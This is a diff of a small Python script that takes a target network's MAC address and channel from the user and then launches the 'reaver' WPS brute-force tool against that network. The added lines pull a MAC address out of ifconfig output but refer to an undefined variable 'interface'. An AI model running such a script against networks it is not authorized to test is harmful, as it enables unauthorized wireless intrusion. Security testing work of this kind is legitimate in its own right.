@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 """Modules"""
 import subprocess
-import sys
+import re
 
 """variables"""
 adapter = input("[+] Input wifi adapter or wireless card: ")
@@ -23,6 +23,9 @@ def handshake(adapter):
     """capture handshake"""
     print("print capturing handshake")
     wifi_mac = input("[+] Input wifi mac address: ")
+    result = subprocess.check_output(["ifconfig", interface], encoding='utf8')
+    output = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", result )
+    print(output[0])
     adapter_mac = input("[+] Input adapter mac: ")
     channel = input("[+] Input Channel of Wifi Network: ")
     subprocess.call(['reaver', '--bssid', wifi_mac,'--channel', channel, '--interface', adapter, '-vvv', '--no-associate'])
